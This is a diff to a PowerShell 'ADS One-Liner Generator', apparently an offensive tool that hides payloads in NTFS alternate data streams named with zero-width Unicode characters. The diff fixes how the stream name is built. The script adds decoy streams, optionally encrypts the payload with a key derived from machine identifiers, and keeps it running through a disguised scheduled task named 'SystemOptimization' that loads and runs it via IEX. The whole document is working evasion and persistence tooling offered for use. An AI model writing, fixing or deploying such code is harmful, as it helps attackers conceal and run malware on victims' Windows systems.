@@ -61,7 +61,7 @@ param(
 )
 
 Write-Host "`n═══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
-Write-Host " ADS One-Liner Generator v2 (Optimized)" -ForegroundColor Cyan
+Write-Host " ADS One-Liner Generator " -ForegroundColor Cyan
 Write-Host "═══════════════════════════════════════════════════════════════`n" -ForegroundColor Cyan
 
 # Validate
@@ -80,7 +80,8 @@ $zwChars = @(0x061C,0x180E,0x200B,0x200C,0x200D,0x200E,0x200F,0x202A,0x202B,0x20
 # Generate stream name HERE on Linux
 $streamName = switch ($ZeroWidthMode) {
     'single' {
-        [char]($zwChars | Get-Random)
+        # Return as string, not char
+        [string][char]($zwChars | Get-Random)
     }
     'multi' {
         -join (1..3 | ForEach-Object { [char]($zwChars | Get-Random) })
@@ -92,8 +93,8 @@ $streamName = switch ($ZeroWidthMode) {
     }
 }
 
-# Get codepoints for manifest
-$streamChars = $streamName.ToCharArray()
+# Get codepoints for manifest (ensure streamName is string)
+$streamChars = [char[]]$streamName  # Convert string to char array properly
 $codepoints = ($streamChars | ForEach-Object { "U+{0:X4}" -f [int]$_ }) -join ' '
 
 # Convert stream name to Unicode escape sequence for embedding
@@ -157,7 +158,7 @@ $minimalCode
 
 # Config
 `$hp='$hostPath'
-`$sn=[char]0x$($streamChars[0].ToString('X4'))$(-join ($streamChars[1..($streamChars.Length-1)] | ForEach-Object { "+[char]0x$($_.ToString('X4'))" }))
+`$sn=$(-join ($streamChars | ForEach-Object { "[char]0x$($_.ToString('X4'))+" })).TrimEnd('+')
 "@
 
 if ($PayloadAtDeployment) {
@@ -185,7 +186,8 @@ if ($Encrypt) {
 $deployCode += @"
 
 if(!(Test-Path `$hp)){ni `$hp -ItemType File -Force|Out-Null}
-`$pl|sc ("`$hp`:"+`$sn) -Force
+`$adsPath="`$hp`:"+`$sn
+`$pl|sc `$adsPath -Force
 "@
 
 # Add decoys
@@ -193,17 +195,20 @@ if ($CreateDecoys -gt 0) {
     foreach ($decoy in $decoyNames) {
         $deployCode += @"
 
-'$($decoy.Content)'|sc "`$hp`:$($decoy.Name)" -Force
+'$($decoy.Content)'|sc "`${hp}:$($decoy.Name)" -Force
 "@
     }
 }
 
 # Persistence
 if ($Persist -eq 'task') {
+    $snConstruct = -join ($streamChars | ForEach-Object { "[char]0x$($_.ToString('X4'))+" })
+    $snConstruct = $snConstruct.TrimEnd('+')
+    
     if ($Encrypt) {
-        $loaderCmd = "```$k=[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join'|'));function dec(`$d,`$k){`$b=[Convert]::FromBase64String(`$d);`$a=[Security.Cryptography.Aes]::Create();`$a.Key=`$k;`$a.IV=`$b[0..15];`$c=`$a.CreateDecryptor();`$t=`$b[16..(`$b.Length-1)];`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);[Text.Encoding]::UTF8.GetString(`$p)};IEX(dec (gc '`$hp`:'+[char]0x$($streamChars[0].ToString('X4'))$(-join ($streamChars[1..($streamChars.Length-1)] | ForEach-Object { "+[char]0x$($_.ToString('X4'))" })) -Raw) ```$k)"
+        $loaderCmd = "```$k=[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join'|'));function dec(`$d,`$k){`$b=[Convert]::FromBase64String(`$d);`$a=[Security.Cryptography.Aes]::Create();`$a.Key=`$k;`$a.IV=`$b[0..15];`$c=`$a.CreateDecryptor();`$t=`$b[16..(`$b.Length-1)];`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);[Text.Encoding]::UTF8.GetString(`$p)};IEX(dec (gc ('`$hp`:'+($snConstruct)) -Raw) ```$k)"
     } else {
-        $loaderCmd = "IEX(gc '`$hp`:'+[char]0x$($streamChars[0].ToString('X4'))$(-join ($streamChars[1..($streamChars.Length-1)] | ForEach-Object { "+[char]0x$($_.ToString('X4'))" })) -Raw)"
+        $loaderCmd = "IEX(gc ('`$hp`:'+($snConstruct)) -Raw)"
     }
     
     $deployCode += @"
@@ -277,8 +282,8 @@ $(if ($PayloadAtDeployment) { "4. Enter payload when prompted" })
 ═══════════════════════════════════════════════════════════════
 
 # Remove ADS (using codepoints from manifest)
-`$sn=[char]0x$($streamChars[0].ToString('X4'))$(-join ($streamChars[1..($streamChars.Length-1)] | ForEach-Object { "+[char]0x$($_.ToString('X4'))" }))
-Remove-Item "$hostPath`:"+`$sn -Force
+`$sn=$(-join ($streamChars | ForEach-Object { "[char]0x$($_.ToString('X4'))+" })).TrimEnd('+')
+Remove-Item ("`$hostPath`:"+`$sn) -Force
 
 # Remove task
 Unregister-ScheduledTask -TaskName 'SystemOptimization' -Confirm:`$false
@@ -323,7 +328,7 @@ if (-not $PayloadAtDeployment) {
         Operator = $env:USER
         GeneratedOn = hostname
         OutputFile = $OutputFile
-        RecoveryCommand = "`$sn=[char]0x$($streamChars[0].ToString('X4'))$(-join ($streamChars[1..($streamChars.Length-1)] | ForEach-Object { "+[char]0x$($_.ToString('X4'))" }))"
+        RecoveryCommand = "`$sn=$(-join ($streamChars | ForEach-Object { "[char]0x$($_.ToString('X4'))+" })).TrimEnd('+')"
     }
     
     $manifest | ConvertTo-Json -Depth 10 | Out-File -FilePath $manifestFile -Encoding UTF8 -Force
